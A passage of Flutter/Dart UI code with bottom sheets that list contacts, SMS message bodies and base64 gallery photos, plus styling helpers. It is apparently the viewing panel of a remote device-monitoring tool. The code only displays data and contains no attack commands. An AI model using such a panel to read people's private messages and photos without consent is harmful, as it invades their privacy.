                  contentPadding:
                      const EdgeInsets.symmetric(horizontal: 0, vertical: 2),
                  leading: Container(
                    width: 36,
                    height: 36,
                    decoration: BoxDecoration(
                      color: _kRed.withOpacity(0.1),
                      borderRadius: BorderRadius.zero,
                      border: Border.all(color: _kBlack, width: 1),
                    ),
                    child: const Icon(Icons.person_rounded,
                        color: _kRed, size: 18),
                  ),
                  title: Text(
                    contacts[i]['name']?.toString() ?? '-',
                    style: const TextStyle(color: _kText, fontSize: 13),
                  ),
                  subtitle: Text(
                    contacts[i]['number']?.toString() ?? '-',
                    style: const TextStyle(color: _kSub, fontSize: 11),
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _smsSheet(List sms) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _kSurface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: _kBlack,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text('SMS (${sms.length})',
                style: const TextStyle(
                    color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: ListView.separated(
                controller: sc,
                padding: const EdgeInsets.symmetric(horizontal: 14),
                itemCount: sms.length,
                separatorBuilder: (_, __) =>
                    Divider(color: _kBlack.withOpacity(0.1), height: 1),
                itemBuilder: (_, i) {
                  final s = sms[i] as Map;
                  return ListTile(
                    contentPadding:
                        const EdgeInsets.symmetric(horizontal: 0, vertical: 4),
                    leading: Container(
                      width: 36,
                      height: 36,
                      decoration: BoxDecoration(
                        color: _kCyan.withOpacity(0.1),
                        borderRadius: BorderRadius.zero,
                        border: Border.all(color: _kBlack, width: 1),
                      ),
                      child: const Icon(Icons.sms_rounded,
                          color: _kCyan, size: 18),
                    ),
                    title: Text(
                      s['address']?.toString() ?? '-',
                      style: const TextStyle(
                          color: _kText,
                          fontSize: 13,
                          fontWeight: FontWeight.w600),
                    ),
                    subtitle: Text(
                      s['body']?.toString() ?? '',
                      style: const TextStyle(color: _kSub, fontSize: 11),
                      maxLines: 2,
                      overflow: TextOverflow.ellipsis,
                    ),
                  );
                },
              ),
            ),
          ],
        ),
      ),
    );
  }

  void _gallerySheet(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: _kSurface,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.zero),
      builder: (_) => DraggableScrollableSheet(
        initialChildSize: 0.75,
        maxChildSize: 0.95,
        expand: false,
        builder: (_, sc) => Column(
          children: [
            Container(
              height: 4,
              width: 36,
              margin: const EdgeInsets.only(top: 10, bottom: 8),
              decoration: BoxDecoration(
                color: _kBlack,
                borderRadius: BorderRadius.circular(2),
              ),
            ),
            Text('Gallery (${imgs.length})',
                style: const TextStyle(
                    color: _kText, fontWeight: FontWeight.bold, fontSize: 14)),
            const SizedBox(height: 8),
            Expanded(
              child: imgs.isEmpty
                  ? const Center(
                      child: Text('No photos', style: TextStyle(color: _kSub)))
                  : GridView.builder(
                      controller: sc,
                      padding: const EdgeInsets.all(10),
                      gridDelegate:
                          const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 3,
                        crossAxisSpacing: 4,
                        mainAxisSpacing: 4,
                      ),
                      itemCount: imgs.length,
                      itemBuilder: (_, i) {
                        try {
                          final raw = imgs[i].toString();
                          final clean =
                              raw.contains(',') ? raw.split(',').last : raw;
                          final bytes = base64Decode(clean);
                          return GestureDetector(
                            onTap: () =>
                                _imgDialog(raw, 'Gallery Photo ${i + 1}'),
                            child: ClipRRect(
                              borderRadius: BorderRadius.zero,
                              child: Image.memory(bytes, fit: BoxFit.cover),
                            ),
                          );
                        } catch (_) {
                          return Container(
                            decoration: const BoxDecoration(
                              color: _kBg,
                              borderRadius: BorderRadius.zero,
                            ),
                          );
                        }
                      },
                    ),
            ),
          ],
        ),
      ),
    );
  }

  // ── UI HELPERS ─────────────────────────────────────────────────────────────
  Widget _sectionHeader(String title, String sub) =>
      Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
        Container(
          padding: const EdgeInsets.only(left: 10),
          decoration: const BoxDecoration(
            border: Border(left: BorderSide(color: _kBlack, width: 3.5)),
          ),
          child: Row(children: [
            Text(title,
                style: const TextStyle(
                    color: _kText,
                    fontSize: 15,
                    fontWeight: FontWeight.w800,
                    letterSpacing: 0.5)),
          ]),
        ),
        const SizedBox(height: 4),
        Text(sub, style: const TextStyle(color: _kSub, fontSize: 11)),
        const SizedBox(height: 4),
        Container(
            width: 60,
            height: 3,
            decoration: BoxDecoration(
                color: _kBlack, borderRadius: BorderRadius.circular(2))),
      ]);

  Widget _menuBtn(String label, Color color, IconData icon, VoidCallback fn) =>
      InkWell(
        onTap: fn,
        borderRadius: BorderRadius.zero,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 12),
          decoration: BoxDecoration(
            color: _kSurface,
            borderRadius: BorderRadius.zero,
            border: Border.all(color: _kBlack, width: 1.5),
            boxShadow: const [
              BoxShadow(
                  color: Colors.black, blurRadius: 0, offset: Offset(4, 4)),
            ],
          ),
          child: Row(children: [
            Container(
              width: 38,
              height: 38,
              decoration: BoxDecoration(
                color: color.withOpacity(0.12),
                borderRadius: BorderRadius.zero,
                border: Border.all(color: _kBlack, width: 1),
              ),
              child: Icon(icon, color: color, size: 18),
            ),
            const SizedBox(width: 10),
            Expanded(
                child: Text(label,
                    style: const TextStyle(
                        color: _kText,
                        fontSize: 12,
                        fontWeight: FontWeight.w700),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis)),
          ]),
        ),
      );

  Widget _field(TextEditingController ctrl, String label,
          {String hint = '', bool isNum = false}) =>
      TextField(
        controller: ctrl,
        keyboardType: isNum ? TextInputType.number : TextInputType.text,
        style: const TextStyle(color: _kText, fontSize: 13),
        decoration: InputDecoration(
          labelText: label,
          hintText: hint,
          labelStyle: const TextStyle(color: _kSub, fontSize: 12),
          hintStyle: const TextStyle(color: _kSub, fontSize: 12),
          filled: true,
          fillColor: _kBg,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          border: const OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide: BorderSide(color: _kBlack, width: 1)),
          enabledBorder: OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide:
                  BorderSide(color: _kBlack.withOpacity(0.3), width: 1)),
          focusedBorder: const OutlineInputBorder(
              borderRadius: BorderRadius.zero,
              borderSide: BorderSide(color: _kAccent, width: 1.5)),
        ),
      );
}